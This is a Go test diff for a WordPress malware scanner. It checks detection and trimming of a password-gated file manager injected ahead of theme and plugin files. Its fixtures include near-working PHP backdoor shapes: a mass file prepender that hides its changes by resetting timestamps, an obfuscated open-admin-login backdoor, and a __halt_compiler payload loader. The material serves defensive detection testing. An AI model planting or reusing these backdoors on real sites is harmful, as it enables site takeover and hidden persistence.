@@ -2254,3 +2254,88 @@ func TestFleetPluginShieldNotFlagged(t *testing.T) {
 		t.Errorf("shield flagged: %+v", d)
 	}
 }
+
+// halaltech.co.uk (superfast, 2026-11-13): a mass injector put a
+// password-gated file manager (49 KB) in front of 84 theme, plugin and core
+// files. The scanner quarantined the plugin and theme files whole (the gate
+// is far over the trim limit) and the site went down on the missing files.
+// The gate is now named apart and cut off at its exact end; the injector,
+// the open admin login and the __halt_compiler loader next to it are
+// caught. Fixtures are inert shapes (bcrypt of no real password).
+func TestFleetPasswordGateTrimmed(t *testing.T) {
+	hash := "$2a$12$" + strings.Repeat("Ab0./", 10) + "Ab0"
+	gate := "<?php\r\n/**\r\n * WordPress Plugin Administration API (fixture)\r\n */\r\n" +
+		"if (isset($_GET['i'])) { header(\"Content-Type: image/png\"); echo \"\\x89PNG\"; exit; }\r\n" +
+		"session_start();\r\nfunction is_logged_in() { return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true; }\r\n" +
+		"if (isset($_POST['password'])) { $h = '" + hash + "'; if (password_verify($_POST['password'], $h)) { $_SESSION['logged_in'] = true; } }\r\n" +
+		"if (is_logged_in()) {\r\n?>\r\n<html><body><p>panel {fixture}</p><?php echo '}'; // } ?>\r\n</body>\r\n</html>\r\n<?php\r\n}\r\n?>\r\n" +
+		"<!DOCTYPE html>\r\n<html><body><form method=\"post\"><input type=\"password\" name=\"password\"></form>\r\n<?php if (true): ?><p>x</p><?php endif; ?>\r\n</body>\r\n</html>"
+	originals := map[string]string{
+		"wp-content/plugins/redirection/modules/wordpress.php": "<?php\n/** Redirection module (inert fixture) */\ndefined( 'ABSPATH' ) || exit;\nfunction red_fixture() { return 1; }\n",
+		"wp-content/themes/jannah/amp-templates/header-bar.php": "<header id=\"top\" class=\"amp-wp-header\">\n\t<?php echo esc_html( get_bloginfo( 'name' ) ); ?>\n</header>\n",
+	}
+	s := newScanner(t)
+	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
+		t.Fatal(err)
+	}
+	root := filepath.Join(t.TempDir(), "home2", "u", "site.example")
+	for rel, orig := range originals {
+		p := filepath.Join(root, rel)
+		os.MkdirAll(filepath.Dir(p), 0o755)
+		os.WriteFile(p, []byte(gate+orig), 0o644)
+		info, _ := os.Lstat(p)
+		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
+		if err != nil || d == nil || d.Signature != "PHP.Injected.PasswordGate" {
+			t.Fatalf("%s: not detected as the gate: %+v %v", rel, d, err)
+		}
+		f, err := s.Record(0, "realtime", p, info, *d)
+		if err != nil || f.Status != "trimmed" {
+			t.Fatalf("%s: %+v %v", rel, f, err)
+		}
+		got, err := os.ReadFile(p)
+		if err != nil || string(got) != orig {
+			t.Fatalf("%s: file not put back as it was: %q %v", rel, got, err)
+		}
+	}
+	// Not a gate: an application's own login page (nothing after it), and
+	// a file without a bcrypt password.
+	for name, body := range map[string]string{
+		"app login": "<?php session_start(); $h = '" + hash + "'; if (isset($_POST['password']) && password_verify($_POST['password'], $h)) { $_SESSION['ok'] = 1; header('Location: /'); exit; } ?>\n<!DOCTYPE html><html><body><form method=\"post\"><input type=\"password\" name=\"password\"></form></body></html>\n",
+		"no hash":   "<?php session_start(); if (isset($_POST['password']) && password_verify($_POST['password'], get_option('h'))) { $_SESSION['ok'] = 1; } ?>\n<html><body></body></html><?php function f() {}\n",
+	} {
+		if d := s.checkContent("/home2/u/public_html/login.php", ".php", []byte(body)); d != nil && d.Signature == "PHP.Injected.PasswordGate" {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+}
+
+func TestFleetRahasiaCompanions(t *testing.T) {
+	s := newScanner(t)
+	for _, c := range []struct{ name, path, body, want string }{
+		{"mass prepender", "/home2/u/site/wp-content/plugin-editor.php", "<?php\n// fixture: the shape only\nclass M { function scanDir() { $it = new \\RecursiveIteratorIterator(new \\RecursiveDirectoryIterator($this->dir)); $r = []; foreach ($it as $i) { $r = array_merge($r, glob($i->getPath() . \"/*.{php}\", GLOB_BRACE)); } return $r; }\n" +
+			" function write($content) { foreach ($this->scanDir() as $f) { $t = filemtime($f); $data = $content; $data .= file_get_contents($f); if (file_put_contents($f, $data)) { touch($f, $t); } } } }\n" +
+			"if (isset($_POST['click'])) { $o = new M($_POST['path']); $o->write(file_get_contents($_FILES['f']['tmp_name'])); }\n", "PHP.Injector.MassPrepend"},
+		{"open admin login, names in pieces", "/home2/u/site/data.php", "<?php\n// fixture: the shape only\n$k = \"DOCU\" . \"MENT_ROOT\"; @chdir($_SERVER[$k]); $l = \"wp-\" . \"load.php\"; include $l;\n" +
+			"$c = \"WP_\" . \"User\" . \"_Query\"; $q = new $c(array('role' => 'Administrator', 'number' => 1, 'fields' => 'ID')); $r = $q->get_results();\n" +
+			"$s = \"wp_\" . \"set_auth\" . \"_cookie\"; $g = \"wp_re\" . \"direct\"; $u = \"admin\" . \"_url\"; $s($r[0]); $g($u()); die();\n", "PHP.Backdoor.OpenAdminLogin"},
+		{"halt_compiler loader", "/home2/u/site/wp-content/geck.php", "<?php\n// fixture: the shape only\nclass Compiler { private $shift = 3; function B($i) { $o = ''; for ($n = 0; $n < strlen($i); $n++) { $o .= chr(ord($i[$n]) - $this->shift); } return $o; }\n" +
+			" function slurp($in, $off) { $fp = fopen($in, 'r'); fseek($fp, $off); $t = tmpfile(); fwrite($t, $this->B(gzinflate(stream_get_contents($fp)))); include socket_get_status($t)['uri']; fclose($t); } }\n" +
+			"(new Compiler)->slurp(__FILE__, __COMPILER_HALT_OFFSET__);\n__halt_compiler();not a payload", "PHP.Dropper.HaltCompilerLoader"},
+	} {
+		d := s.checkContent(c.path, ".php", []byte(c.body))
+		if d == nil || d.Signature != c.want {
+			t.Errorf("%s: got %+v, want %s", c.name, d, c.want)
+		}
+	}
+	// A phar stub and a one-time login that checks a token are not these.
+	for name, body := range map[string]string{
+		"phar stub":       "<?php\nPhar::mapPhar('tool.phar');\nrequire 'phar://tool.phar/bin/tool';\n__HALT_COMPILER(); ?>\n",
+		"token login":     "<?php\nrequire 'wp-load.php';\nif (!hash_equals(get_option('one_time_token'), (string) ($_GET['t'] ?? ''))) { exit; }\nwp_set_auth_cookie(1);\n",
+		"backup touching": "<?php\nforeach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)) as $f) { $t = filemtime($f); copy($f, $backup . basename($f)); touch($backup . basename($f), $t); }\n",
+	} {
+		if d := s.checkContent("/home2/u/site/tool.php", ".php", []byte(body)); d != nil &&
+			(d.Signature == "PHP.Injector.MassPrepend" || d.Signature == "PHP.Backdoor.OpenAdminLogin" || d.Signature == "PHP.Dropper.HaltCompilerLoader") {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+}
